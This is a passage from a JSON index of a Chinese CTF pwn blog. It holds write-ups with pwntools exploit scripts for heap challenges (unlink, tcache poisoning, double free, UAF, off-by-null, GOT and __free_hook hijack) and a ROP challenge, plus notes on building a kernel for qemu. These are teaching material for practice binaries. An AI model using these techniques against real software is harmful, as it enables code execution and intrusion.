libc.sym['system']\n```\n\n(3)利用off-by-one向上合并chunk0和chunk1，执行unlink攻击：\n\n```\n#注释头\n\nadd(0,0x98,'aaaa')#0\nadd(1,0x98,'bbbb')#1\nadd(2,0x90,'cccc')#2\nadd(3,0x90,'/bin/sh\\x00')#3\n\npayload=p64(0)+p64(0x91)+p64(chunklist-0x18)+p64(chunklist-0x10)+p64(0)*14+p64(0x90)+'\\xa0'\nedit(0,payload)\ndelete(1)\n```\n\n(4)修改chunklist[0].chunk指向free_hook：\n\n```\n#注释头\n\nedit(0,p64(0)*3+p64(free_hook)+p64(0x10))\n#由于unlink攻击赋值之后，chunk0数据部分指向了chunklist_addr-0x18位置，所以需要填充p64(0)*3\n```\n\n(5)修改free_hook为system：\n\n```\n#注释头\n\nedit(0,p64(system))\n```\n\n(6)利用free触发system，getshell\n\n```\n#注释头\n\nfree(3)\np.interactive()\n```\n\n \n\n \n\n \n\n \n","tags":["unlink"],"categories":["PWN","pwn堆-unlink"]},{"title":"bugs bunny ctf 2017-pwn150","url":"/2021/08/14/bugs bunny ctf 2017-pwn150/","content":"\n \n\n1.常规checksec，可以发现NX enabled，并且没有RAX字段。打开IDA后可以看到在hello函数中存在栈溢出：\n\n```\n#注释头\n\nchar s; // [rsp+0h] [rbp-50h]\n---------------------------------------------------------------\nfgets(&s, 192, stdin);\n```\n\n然后分析程序，汇编代码什么的，没找到有call eax之类的操作，这里就选择ROP来getshell。\n\n2.由于是64位程序，传参方式不同，依次为：rdi, rsi, rdx, rcx, r8, r9, 栈，而我们的目标是跳转system函数，让system函数读取binsh字符串，system函数又只有一个参数，所以这个参数必然需要在rdi中读取。我们的输入是位于栈上，所以需要一个pop rdi;和ret的操作命令，让我们的输入赋值给rdi寄存器。\n\n3.在哪找pop rdi; ret;也是个问题，这里有个工具可以实现ROPgadget ，在linux下可以输入：以下代码来获取代码地址。\n\n```\n#注释头\n\nROPgadget --binary pwn150 | grep \"pop rdi\"\n```\n\n4.然后需要system函数的地址，这里today函数直接call了该函数，所以可以直接用IDA在汇编中看到该地址(行的前缀)。或者先ctrl + s，在got.plt中搜索一下，发现也能找到system函数。所以这里获取system地址我们可以有两种方法：\n\n①pop rdi之后，让ret指向today函数中的call_system_地址：0x40075F\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191553103.jpeg)\n\n②pop rdi之后，让ret指向从elf = ELF('./pwn150')和system_addr = p64(elf.symbols['system'])中找到的地址system_addr，也就是plt表中的地址(这里其实可以直接在IDA中找到)\n\n(但是需要注意的是，这是64位程序，system函数从rdi上取值，与栈无关系，所以call和直接跳转plt差不多，但是如果是32位程序，那么布置栈的时候就需要考虑到plt表和直接call system函数的不同了。如果是直接跳转plt表中的地址，那么栈的布置顺序应该是：\n\n**system函数-system函数的返回地址-sytem函数的参数。**\n\n但如果是跳转call system，那么由于call指令会自动push进eip，则栈布置应该为：\n\n**call system函数地址-system函数参数。**\n\n两者不太一样，需要加以区分。后面会有got表和plt的详细讲解)\n\n4.接下来寻找binsh字符串，但是没找到，只有sh，也可以开shell。shift+F12进入字符串后右键在十六进制中同步，之后可以对应看到sh的字符地址，由于sh之后直接就是结束字符00，不会往后多读，而只会读取sh，所以可以直接将该字符串的地址写在pop rdi地址后面，直接赋值给rdi，写进去。\n\n5.编写payload，顺序为：payload = padding + pop_rdi_addr + bin_sh_addr + system_addr（或者是call_system_addr）。\n\n \n\n▲由于64位程序中通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈（根据调用约定的方式可能有不同，通常是这样），因此，我们就需要一个给RDI赋值的办法。也就是ROPgadget --pwn150 | grep “pop rdi”这段代码获取。所以进入system中用call和return直接进都行，参数是从rdi中获取的，进去之后栈上的返回地址是啥都没关系，因为已经getshell，用不到。\n\n▲执行call func_addr指令相当于push eip ;jmp func_addr，而执行plt表中地址则相当于只有jmp func_addr，没有前面的push eip，所以需要手动设置这个eip，而call则不用。注意这是32位程序下，64位程序下则按照本篇所说，直接pop rdi即可。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"hitb2018_gundam","url":"/2021/08/14/hitb2018_gundam/","content":"\n1.常规checksec，保护全开。IDA打开找漏洞，在删除函数sub_D32()中存在Double free和UAF漏洞：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191515866.jpeg)\n\n通过逆向分析，结构体重整化：\n\n```\n#注释头\n\nstruct gundam\n{\nint flag;\nchar *name;\nchar type[24];\n}gundam;\n\nstruct gundam* factory[9]\n```\n\n之后如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191515821.jpeg)\n\n(1)Double free:可以看到在删除函数中，程序通过factory[idx]和count来判断gundam是否存在，并且只是free掉了factory[idx]->name这个chunk，并且将flag置空，但是并没有将factory[idx]这个指针置空。而且这是在Tcache机制下，没有对Double free的检查，那么就代表如果其实我们是可以连续多次free掉factory[idx]->name这个chunk的。\n\n(2)UAF:另外factory[idx]->name这个指针也没有置空，可以通过factory[idx]再次利用，形成UAF漏洞。\n\n2.思考利用方式:由于libc版本是2.26，从unsortedbins中申请回的chunk如果不被程序更改内容，其fd和bk仍然保存，可以泄露地址。由于build的时候，没有将name这个chunk的内容初始化为0，所以该chunk如果进入unsortedbin中之后，fd被赋值为main_arena+88，那么申请回来之后，name中的bk就带有main_arena+88的地址，可以通过visit打印出来，从而计算得到，泄露libc基地址。\n\n(1)那么先填满tcache之后，再加个chunk，使其进入unsorted bin中，然后申请回来就可以得到libc地址了。\n\n(2)得到libc地址后，由于libc版本是2.26，仍然存在tcache poisoning漏洞，就可以通过Double free漏洞进行类似fastbins attack攻击。\n\n```\n#注释头\n\n假如申请chunk0,chunk1，然后连续free(chunk0)两次，这样tcache bin中就是：\nchunk0.fd ->chunk0，即chunk0->chunk0\n那么第一次申请回chunk0，修改fd为fakechunk，tcache bin中就是：\nchunk0.fd->fakechunk，即chunk0->fakechunk\n之后再申请回chunk0，再申请一次就是fakechunk了，实现任意地址修改。\n★这个漏洞在libc2.27及之后就被修复了，即不能连续free(chunk0)两次，否则程序直接崩溃。\n```\n\n①先申请三个chunk，chunk0,chunk1,chunk2，chunk1存放binsh字符串，chunk2用来防止被topchunk吞并。之后释放chunk0两次，那么tcache中的chunk0的fd指针就会指向自己，形成：chunk0->chunk0。\n\n②之后再申请一个chunk，对应索引为0，申请回第一个chunk0，修改name内容__free_hook_addr，而name内容的前八个字节就是chunk0的fd，即tcachebin中就会由之前的chunk0->chunk0变为chunk0->__free_hook_addr\n\n③再连续申请两个chunk，对应索引为3,4，chunk4的头地址就会是__free_hook_addr-0x10，那么修改chunk4的name中的前八个字节就相当于修改_free_hook，这里使其变为system的真实地址，再free(chunk_binsh)即可getshell。\n\n3.编写exp:\n\n(1)前置增删改查函数：\n\n```\n#注释头\n\ndef build(name):\n    io.sendlineafter(' :', \"1\")\n    io.sendafter(' :', name)\n    io.sendlineafter(' :', \"1\")\n\ndef visit():\n    io.sendlineafter(' :', \"2\")\n\ndef destory(idx):\n    io.sendlineafter(' :', \"3\")\n    io.sendlineafter(\":\", str(idx))\n\ndef blow():\n    io.sendlineafter(' :', \"4\")\n```\n\n(2)泄露地址：\n\n```\n#注释头\n\n#创建9个chunk,再删除9个chunk,7个进入tcache,1个进入unsortedbin,1个进入topchunk,这里由于有个0x28的gundam_chunk在，所以不会全部都进入topchunk\nfor i in xrange(9):\n    build(\"AAAA\")\nfor i in xrange(9):\n    destory(i)\nblow()\n#为了清空count\n\n#清空tcachebin之后再申请一个chunk就是unsortedbin中的\nfor i in xrange(7):\n    build('BBBBBBBB')\nbuild('CCCCCCCC')\n\n#leak:\nvisit()\nmain_arena = 0x3dac20\nlibc.address = u64(io.recvuntil(\"\\x7f\")[-6: ].ljust(8, '\\0')) - 88 - main_arena\nsuccess(\"libc -> {:#x}\".format(libc.address))\n```\n\n(3)清空count，方便计算索引:\n\n```\n#注释头\n\nfor i in xrange(8):\n    destory(i)\nblow()\n```\n\n(4)利用tcache poisoning和double free漏洞，getshell:\n\n```\n#注释头\n\nbuild(\"0000\")\nbuild(\"/bin/sh\\0\")\nbuild(\"2222\")\ndestory(0)\ndestory(0)\nbuild(p64(libc.sym['__free_hook']))\nbuild(\"/bin/sh\\0\")\nbuild(p64(libc.sym['system']))\ndestory(1)#1或者3都可以\n\nio.interactive()\n```\n\n \n\n▲这个泄露地址的漏洞在没有tcache机制的libc版本中都可以用，但是tcache poisoning只有libc2.26才可以用\n\n \n\n参考资料：\n\nctf-all-in-one\n\n \n","tags":["Tcache"],"categories":["PWN","pwn堆-Tcache"]},{"title":"kernel编译","url":"/2021/08/14/kernel编译/","content":"\n1.安装依赖：\n\n```\n#注释头\n\nsudo apt-get install make gcc bison flex libssl-dev musl-tools\nsudo apt-get install libssl-dev\nsudo apt-get install gcc make libncurses5-dev openssl libssl-dev \nsudo apt-get install build-essential \nsudo apt-get install pkg-config\nsudo apt-get install libc6-dev\nsudo apt-get install bison\nsudo apt-get install flex\nsudo apt-get install libelf-dev\nsudo apt-get install libncurses5-dev libssl-dev \nsudo apt-get install build-essential openssl \nsudo apt-get install zlibc minizip \nsudo apt-get install libidn11-dev libidn11\n```\n\n可能有些重复的，没事，够编译环境就行。\n\n2.下载kernel源码，解压，编译：\n\n```\n//注释头\n\nwget https://mirror.tuna.tsinghua.edu.cn/kernel/-------------------\ntar -zvxf linux-4.4.70.tar.gz\ncd linux-4.4.70\nmake menuconfig\n//这里进入之后直接esc保存退出即可，相关的设置来到之后生成的.config中来\n\nvim .config\n//将CONFIG_MODULE_SIG_ALL,CONFIG_MODULE_SIG_KEY和CONFIG_SYSTEM_TRUSTED_KEYS三项注释掉，编译时系统会自动生成一次性密钥来加密，另外记得把CONFIG_DEBUG_INFO=y去掉，不然新内核带debug信息超大\n//这里踩过很多坑，虚拟机直接爆炸，各种错误。\n\nmake\n```\n\n但是如果需要直接调试，则看大佬的吧：\n\nhttps://eternalsakura13.com/2018/04/13/qemu/\n\n编译完成之后在linux-4.4.70/arch/x86_64/boot/下保存bzImage，用来启动qemu，根目录下有vmlinux，用来分析。\n\n3.下载busybox源码，解压，编译，制作根目录系统\n\n```\n//注释头\n\nwget https://busybox.net/downloads/busybox-1.19.4.tar.bz2\ntar -jxvf busybox-1.30.0.tar.bz2\ncd busybox-1.30.0\nmake menuconfig \n# Busybox Settings -> Build Options -> Build Busybox as a static binary\nmake install\n```\n\n之后在busybox-1.30.0/_install/目录下就是根目录文件系统\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191459296.jpeg)\n\n然后就用cpio生成上述的rootfs.cpio，用来配合bzImage启动qemu\n\nfind ./* | cpio -H newc -o > rootfs.cpio\n\n4.启动qemu:\n\n(1)将rootfs.cpio、bzImage拖到一个文件夹下\n\n(2)制作启动文件：\n\n```\n//注释头\n\ntouch boot.sh\nvim boot.sh\n```\n\n(3)将下列代码拷入：\n\n```\n#注释头\n\n#! /bin/sh\nqemu-system-x86_64 \\\n-m 64M \\\n-kernel ./bzImage \\\n-initrd ./rootfs.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\" \\\n-s \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n```\n\n图形化界面-nographic和console=ttyS0配合使用，启动界面就变成终端。\n\n最后./boot.sh即可启动qemu虚拟机。\n\n \n\n \n\n \n\n \n\n \n\n","tags":["kernel-Knowledge"],"categories":["pwn-kernel"]},{"title":"how2heap_libc2.27_summary","url":"/2021/08/14/how2heap_libc2.27_summary/","content":"\n\\1. fastbin_dup:\n填满Tcache后free(a),free(b),free(a)之后即可。\n\n\\2. fastbin_reverse_into_tcache:\n(1)申请14个chunk，都释放掉0-6进入tcache，7-13进入fastbin中。(这14个chunk大小需相等)\n(2)此时mallco掉7个chunk，就可以将tcache中的7个chunk都申请出来。\n(3)再利用漏洞修改chunk7的fd为栈上的地址(任意地址)，这时再malloc一次，就会从fastbin中申请chunk，由于fastbin先进后出的关系，会将chunk13申请出来。同时由于tcache机制，当fastbin中对应大小的bin中还存在chunk，就会将这些Chunk都拿出来放进对应大小的tcache中。\n(4)由于先进后出的关系不变，拿出顺序为chunk12,chunk11…chunk7。进入tcache后的顺序为chunk7,chunk8….chunk12。\n(5)这样又由于chunk7的fd被我们改掉了，所以实际的顺序为chunk7->chunk7.fd->chunk8…\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449078.png)\n(6)同时释放可以向栈上写入堆地址，之后再连续申请就可以将从栈上申请chunk。\n\n\\3. house_of_botcake(只能在double free前提下使用)：\n(1)申请chunk0-chunk6用于填充tcache，然后申请chunk7,chunk8,chunk9，其中chunk9用于防止和topchunk合并\n(2)释放chunk0-chunk6填充tcache，释放chunk7，chunk8，发生合并进入unsortedbin中，称为chunk_U。\n(3)malloc一次，将chunk6从tcache中申请出来，然后再释放chunk8(double free)，这样chunk8就会进入tcache中。现在chunk8就会既在tcache中，又被包含在unsortedbin的chunk_C中。\n(4)再申请一次大小大于以上chunk_size的chunk_C，这个chunk_C就会将chunk_U切割，同时使得chunk_C包含chunk8，这样就可以从chunk_C修改chunk8的fd指针。\n(5)由于chunk8同时还在tcache中，那么再连续两次chunk8大小的size就可以将chunk8和chunk8.fd申请出来，实现任意地址申请堆块。\n\n\\4. house_of_einherjar(需要泄露堆地址)：\n(1)申请3个chunk，chunka,chunkb,chunkc，c的真实size大于0x100；\n(2)然后通过chunkb的堆溢出(off by one/null)，修改chunkc的in_use位为0，并且在chunkc的prev_size处伪造fake_prev_size=chunkb+chunka-0x10；\n(3)在chunka中伪造chunk，满足要求：\n&Fake_chunk = chunka+0x10\nFake_chunk->size = sizeof(chunka) -0x10+sizeof(chunkb)\nFake_chunk->fd = Fake_chunk\nFake_chunk->bk = Fake_chunk\n用以绕过unlink的检查。\n(4)随后申请7个与chunkc同大小的chunk，释放填充tcache；\n(5)释放chunkc，因为chunkc的prev_inuse位被置为0，所以会向上合并，通过fake_prev_size找到前一个堆块，即fake_chunk，并比较fake_prev_size与fake_chunk的size是否相等，如果相等则发生堆合并，进入unlink脱链。\n(6)此时合并的堆块，会被放入unsortedbin中，而此时的chunkb还处于使用状态，释放chunkb（因为其大小与前面tcache大小不同，会被放入新的tcachebin中）。\n(7)再申请一个大于chunkc大小的chunk，会直接从unsortedbin中去寻找划分，该chunk就是fakechunk+chunkb，且合理配置chunka和chunkc的大小使得能够覆盖到chunkb的数据，随后通过申请回来的该chunk改写chunkb的fd指针，将chunkb申请回来，再次申请就能够实现tcache poisoning攻击。\n这里和2.23有点不太一样，这里利用的是再释放chunkb从而使得其进入tcache，修改fd制造tcache poisoning，因为tcache不会检查size，只要fd就可以任意申请。\n\n\\5. house_of_force:一样的，没多大差别\n\n6.house_of_lore:和2.23差不多，没多大差别\n\n7.large_bin_attack:和2.23基本一样。\n\n\\8. overlapping_chunks(能够溢出修改size位)：\n只有free之后修改size的了.\n\n\\9. poison_null_byte:\n与2.23差不多，不过需要考虑到tcache的影响，有时候需要先填满tcache。一般情况是4个chunk，最后一个chunk防止合并，前三个chunk用来制造堆块重叠，但是中间其实可以插入较多的堆块，制造多个堆块重叠，方便利用。\n\n\\10. tcache_dup:基本没啥用，现在2.27也基本都修复了这个问题，不过做题的时候可以尝试一下看行不行。2.28就已经增加了key字段检查\n\n11.tcache_ house_of_spirit:\n与house_of_spirit一样，修改栈上的的chunk指针为栈上的地址，在栈上伪造chunk，只需要伪造size即可，注意in_use位的设置。同时由于tcache在free的时候不会依据chunk的size来对下一个chunk做检查，所以这里不需要伪造下一个chunk的size。\n\n\\12. tcache_poisoning：\n已经在tcache链表中的chunk，如果修改了fd，那么直接两次malloc即可获得fd对应地址的chunk，不需要构造字节错位，而且malloc之后得到的chunk其pre_size和size都是0。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449154.png)\n\n\\13. Tcache Stashing Unlink Attack(需要calloc申请chunk，能够控制smallbin的bk指针)：\n(1)申请9个chunk，chunk1-chunk9，释放chunk4-chunk9进入tcache中，释放chunk2进入tcache，再顺序释放chunk1和Chunk3进入unsortedbin中。\n(2)申请一个largebin大小的chunk，使得chunk1和chunk3被整理到smallbin中。\n(3)申请两个chunk，将chunk2和chunk9从Tcache中申请出来，使得tcache中存在两个空位。\n(4)利用UAF之类的漏洞修改chunk3的bk指向fake_chunk，这里的chunk3是smallbin中的第一个chunk：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449159.png)\n\n即为图中的0x602390的bk指针，指向一个fake_chunk，栈上的地址。\n(5)同时由于smallbin按照FIFO的顺序，所以依据bk指针进行寻找，那么如果从smallbin中申请chunk，申请顺序应该是0x602250 —▸ 0x602390 —▸ 0x7fffffffdd10。\n(6)调用calloc，使得chunk不从tcache中申请，从smallbin中申请，那么就会触发下列在使用smallbin时，只在use tcache的宏定义中的代码：\n\n```\nwhile ( tcache->counts[tc_idx] < mp_.tcache_count\n&& (tc_victim = last (bin) ) != bin)\n{\n    //如果成功获取了Chunk\n    if (tc_victim != 0)\n    {\n         // 获取 small bin 中倒数第二个 chunk 。\n        bck = tc_victim->bk;\n        //设置标志位\n        set_inuse_bit_at_offset (tc_victim, nb);\n        // 如果不是 main_arena，设置对应的标志\n        if (av != &main_arena)\n            set_non_main_arena (tc_victim);\n        //取出最后一个Chunk\n        bin->bk = bck;\n        bck->fd = bin;\n        //将其放入到Tcache中\n        tcache_put (tc_victim, tc_idx);\n    }\n}\n```\n\n这样就会将tc_victim，也就是这里的0x602390，通过tcache_put放入到tcache中，同时tcache_put这个函数中没有任何的安全检查，所以可以直接放入。那么由于tcache的FILO关系，依据fd来申请，0x602390的fd为0x7fffffffdd10(fakechunk)，所以会将fakechunk提到tcache的头部。同时又由于tcache中的指针指向的是chunk头部+0x10，那么在tcache中的顺序就是\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449163.png)\n\n这里的0x7fffffffdd20就是fakechunk，再次申请0xa0大小的chunk就可以将fakechunk给申请出来。同时又由于从smallbin链表中的unlink中的bck->fd = bin的赋值操作，会导致0x7fffffffdd20+0x10处会被赋值上smallbin的libc地址：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449165.png)\n\n这样Tcache Stashing Unlink Attack修改bk为target_addr，malloc后会控制target_addr-0x10，会在target_addr+0x10处写入main_arena_addr。\n\n14.unsafe_unlink:和2.23差不多，就只是申请的chunk使之大于0x410，从而不使用tcache。\n\n15.unsorted_bin_attack:申请较大的chunk使得从unsortedbin中重新申请chunk时不会将该大小的chunk放入对应的tcache中。或者修改tcache结构体的counts域，使得系统认为该tcache已经满了，那么就不会放入了。\n\nhttps://github.com/firmianay/CTF-All-In-One/blob/master/doc/3.1.8_heap_exploit_3.md#unsorted_bin_attack\n\n\\16. unsorted_bin_into_stack_attack：和2.23差不多，只要满足chunk的大小大于0x408从而不使用tcache即可，或者能够修改tcache结构体的count域。\n\n \n","tags":["how2heap"],"categories":["PWN","how2heap"]},{"title":"note-UAF","url":"/2021/08/14/note-UAF/","content":"\n1.源文件，忘记是哪里的题了。\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nstruct note *notelist[10];\nint count = 0;\n\nstruct note{\n  void (*print_note)();\n  char *content;\n};\n\nvoid print_note_content(struct note *ptr_n) \n{ \n  puts(ptr_n -> content); \n}\n\nvoid add_note(){\n  int i;\n  char buf[8];\n  int size;\n  if (count > 10)\n  {\n    puts(\"Full\");\n    return;\n  }\n  for (i = 0; i < 10; i++){\n    if (!notelist[i])\n    {\n      notelist[i] = (struct note *)malloc(sizeof(struct note));\n      if (!notelist[i])\n      {\n        puts(\"Alloca Error\");\n        exit(-1);\n      }\n      notelist[i] -> print_note = print_note_content;\n      printf(\"Note size :\");\n      read(0, buf, 8);\n      size = atoi(buf);\n      notelist[i] -> content = (char *)malloc(size);\n      if (!notelist[i] -> content) \n      {\n        puts(\"Alloca Error\");\n        exit(-1);\n      }\n      printf(\"Content :\");\n      read(0, notelist[i] -> content, size);\n      puts(\"Success !\");\n      count++;\n      break;\n    }\n  }\n}\n\nvoid del_note() \n{\n  char buf[4];\n  int idx;\n  printf(\"Index :\");\n  read(0, buf, 4);\n  idx = atoi(buf);\n  if (idx < 0 || idx >= count) \n  {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if (notelist[idx]) \n  {\n    free(notelist[idx]->content);\n    free(notelist[idx]);\n    puts(\"Success\");\n  }\n}\n\nvoid print_note() \n{\n  char buf[4];\n  int idx;\n  printf(\"Index :\");\n  read(0, buf, 4);\n  idx = atoi(buf);\n  if (idx < 0 || idx >= count) \n  {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if (notelist[idx]) \n  {\n    notelist[idx] -> print_note(notelist[idx]);\n  }\n}\n\nvoid magic() \n{ \n  system(\"cat ./flag\"); \n}\n\nvoid menu() {\n  puts(\"----------------------\");\n  puts(\"       UAF NOTE       \");\n  puts(\"----------------------\");\n  puts(\" 1. Add note          \");\n  puts(\" 2. Delete note       \");\n  puts(\" 3. Print note        \");\n  puts(\" 4. Exit              \");\n  puts(\"----------------------\");\n  printf(\"Your choice :\");\n};\n\nint main() {\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 2, 0);\n  char buf[4];\n  while (1) {\n    menu();\n    read(0, buf, 4);\n    switch(atoi(buf)) \n    {\n      case 1:\n        add_note();\n        break;\n      case 2:\n        del_note();\n        break;\n      case 3:\n        print_note();\n        break;\n      case 4:\n        exit(0);\n        break;\n      default:\n        puts(\"Invalid choice\");\n        break;\n    }\n  }\n  return 0;\n}\n```\n\n编译一下：\n\n```\n#注释头\n\ngcc note.c -no-pie -o note\n```\n\n2.打开IDA，查漏洞，del-note函数中存在UAF漏洞，并且还有后门：\n\n```\n#注释头\n\nif ( notelist[idx] )\n{\n    free(notelist[idx]->content);\n    free(notelist[idx]);\n    puts(\"Success\");\n}\n//这里经过IDA人工数据修改过，刚打开不会是这样的。\n----------------------------------------------------\nint magic()\n{\n    return system(\"cat ./flag\");\n}\n```\n\n可以看到在Free之后没有将指针置空，导致Free之后，如果通过程序中的print选项来打印依然可以调用被该指针对应的函数，所以这里存在UAF。\n\n3.这一题中有一个结构体，定义如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191534858.jpeg)\n\n其中malloc顺序是：\n\n(1)malloc控制数据部分chunk_control，固定大小为0x10。\n\n(2)将content，也就是真正数据部分malloc出来，chunk_data，这里可以设置size。\n\nfree顺序是：\n\n(1)先free掉data部分，chunk_data。\n\n(2)再free控制数据部分的struct，chunk_control。\n\n4.思考攻击思路，既然有UAF漏洞，那么我们可以想办法Free几个chunk，然后利用fastbins先进后出的原则，将某个控制数据部分的chunk_control申请回来变成我们可以操作的chunk_data，进行fastbins attack。之后修改其中的打印函数地址，改为后门函数地址，那么使用程序中的print就可以跳转后门函数获取flag。\n\n5.先申请两个结构，data部分至少为0x19，使得chunk_data不落入到0x20的fastbins中。之后释放掉这两个结构，然后fastbins中的结构如下：\n\n```\n#注释头\n\nfastbinsY[0]:0x10:chunk_control1->chunk_control0\nfastbinsY[x]:0xxx:chunk_data1->chunk_data0\n```\n\n6.然后申请一个0x10大小的结构，编号A，该结构中的对应就变成这样：\n\n```\n#注释头\n\nchunk_controlA=chunk_control1\nchunk_dataA=chunk_control0\n```\n\n7.现在可以修改chunk_dataA，将其内容改为后门函数地址，然后使用程序中的print，输入索引为0，然后就会运行chunk_control0中的打印函数，也就相当于运行chunk_dataA中的后门函数。\n\n简单exp如下：\n\n```\n#注释头\n\nadd(0x20,'aaaaaaaa') #chunk_control0+chunk_data0\nadd(0x20,'AAAAAAAA') #chunk_control1+chunk_data1\n#这里的0x20可以随便改，只要大于等于0x19即可，两个0x20也可以不一样。\n\nfree(0)\nfree(1)\n#free顺序:chunk_data0,chunk_control0,chunk_data1,chunk_control1\n\nbackdoor = p64(elf.sym['magic'])\nadd(0x10,backdoor)\n#malloc顺序:chunk_controlA=chunk_control1,chunk_dataA=chunk_control0\n\nshow(0)\nprint(p.recv())\n#获取flag\n```\n","tags":["UAF"],"categories":["PWN","pwn堆-UAF"]},{"title":"pesp-heap_overflow-struct","url":"/2021/08/14/pesp-heap_overflow-struct/","content":"\n1.第三种方法，通过堆溢出直接改struct，然后更改结构体chunklist[0].chunk中保存的chunk地址，使其指向free_got_addr，再通过程序中的show函数就可以泄露出free_got_addr中保存的free真实地址，从而获得libc的基地址。当然，这得要求先有一个free来让free的延迟绑定发生。\n\n2.由于这里的chunk地址已经变成free_got_addr，所以当我们修改该chunk的内容时，就相当于修改got表中值，也就修改了真实函数地址的值。这里就可以通过修改该chunk内容来劫持free的got表为system函数真实地址，从而free一个内容为binsh的chunk来getshell。\n\n3.编写exp，增删改查函数就不多说了。\n\n(1)申请三个chunk，先将chunk1释放，之后chunk0用来堆溢出，修改chunk1的fd，进行fastbins攻击，将fakechunk放在struct前面某个位置。这里用到字节错位，原理一样，利用0x7f来攻击fastbins。再连续申请两个chunk，chunk1和chunk3就回来，这里的chunk3就是fakechunk了。现在就可以修改fakechunk从而修改掉chunklist[0].chunk的值，使其指向free_got_addr。从而调用show函数泄露free的真实地址。\n\n```\n#注释头\n\nadd(0x60,\"\\x00\"*0x60) #chunk0\nadd(0x60,\"\\x11\"*0x60) #chunk1\nadd(0x60,'/bin/sh\\x00') #chunk2 binsh\n\nremove(1)\nchange(0,0x100,flat(\"\\x00\"*0x60,p64(0),p64(0x71),p64(bss)))#chunk0_overflow\nadd(0x60,\"\\x11\"*0x60)#get chunk1\nadd(0x60,flat(\"\\x00\"*0x3,p64(0x100),p64(free_got_addr)))#get fakechunk\nshow()\nio.recvuntil(\"0 : \")\nlibc_base = u64(io.recv(6).ljust(8,'\\x00')) - libc.sym['free']\n```\n\n(2)再修改chunk0的内容为system真实地址，这样就相当于劫持free的got表，之后释放掉chunk2即可getshell。\n\n```\n#注释头\n\nsystem_libc = libc_base + libc.sym['system']\nputs = libc_base + libc.sym['puts']\nchange(0,0x100,flat(p64(system_libc,),p64(puts)))\nremove(2)\nio.interactive()\n```\n\n▲需要注意的一点就是，由于read函数读取，所以我们发送数据时一定会有一个\\x0a加入进去，这里如果不考虑进入，free函数后面就是put函数，那么就会造成put函数的Got表被更改，从而无法成功调用put函数。而程序在循环体中的菜单部分又一定会调用put函数，那么这样就会造成程序崩溃。所以需要将put函数也加入进去，但是这样又会造成put函数下一个函数被覆盖\\x0a。不过不要紧，gdb调试可以看到put函数下一个函数是stack_chk_fail函数，也就是检查canary出错时才会调用。我们有没有栈溢出修改canary，这个函数当然不会被调用，程序就不会崩溃。\n\n \n\n \n\n \n","tags":["Heap-Skill"],"categories":["PWN","pwn堆-刷题技巧"]},{"title":"pesp_off-by-null","url":"/2021/08/14/pesp_off-by-null/","content":"\n1.还是之前的2018网鼎杯的pesp题目。这里假设没有堆溢出，有PIE保护，无法劫持got表。只使用0字节溢出漏洞来获取libc地址，再根据得到的libc地址来更改malloc_hook和realloc_hook里面保存的地址为one_gadget，一步getshell。(realloc_hook为onegadget，malloc_hook为__libc_realloc函数中调整栈帧的地方)\n\n2.先梳理一下0字节溢出漏洞，一般的chunk改内容都是：\n\n```\n#注释头\n\nread(0, chunk_ptr, size);\n```\n\n这样就只能输入size这么大的内容，但是这道题中，在add函数中和change函数中：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536207.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536488.jpeg)\n\n可以看到给chunk添加内容的语句都是：\n\n```\n#注释头\n\n*(itemlist[i].cont + read(0, itemlist[i].cont, len)) = 0;// off by null\n```\n\n这样当我们将chunk内容顶满之后，程序会将chunk指针最后部分再溢出一个字节赋值为0，这就是off-by-null。\n\n由于scanf函数会在末尾自动补\\x00，这其实也是一种off-by-null，\n\n```\n#注释头\n\nchar buf[10];\nscanf(\"10%s\",buf);\n```\n\n \n\n▲free源码：\n\n```\n#注释头\n\nif (!prev_inuse(p)) {\n    prevsize = p->prev_size;\n    size += prevsize;\n    p = chunk_at_offset(p, -((long ) prevsize));\n    unlink(av, p, bck, fwd);\n}\n```\n\n也就是如果当前chunk的IN_USE位为0，那么就根据当前chunk的pre_size位，找到前一个chunk_pre，将chunk_pre的size位改成size+pre_size，通过Unlink取出chunk_pre，准备合并。(之后的检查代码会再循环，也就是再看chunk_pre的IN_USE位是不是0来判断要不要再向上合并，这里不重要)\n\n所以如果我们通过off-by-null，溢出0到chunk_next的size位中的IN_USE位，那么当前chunk就会被标记为Free，这样在Free(chunk_next)时，就会将chunk和chunk_next合并。如果我们又更改了chunk_next的pre_size位，使它变得更大，那么就可以向上合并更大的chunk块。这就是off-by-null的利用方法，这题中如下：\n\n(需要注意的是，由于溢出的是一个字节而不是一个Bit，所以size一般都设置为0xf0，从而使size位变成0x101，溢出之后进而变成0x100。但如果size最开始设置为0x20，size位就是0x30，溢出0字节就会变成0x00，那样程序照样崩溃。)\n\n(1)先申请四个chunk，分别为chunk0,chunk1,chunk2,chunk3。(chunk3防止合并用)\n\n(2)然后free掉chunk0，(这里chunk0需要足够大，一般得大于0x80，也就是MAX_fastbins)，使其进入unsortedbins中。(这里必须free掉chunk0，不然之后修改掉chunk2的pre_size位时，然后free掉chunk2时，程序依据pre_size来判断是否合并时，发现chunk0仍旧处于使用当中，但pre_size包含了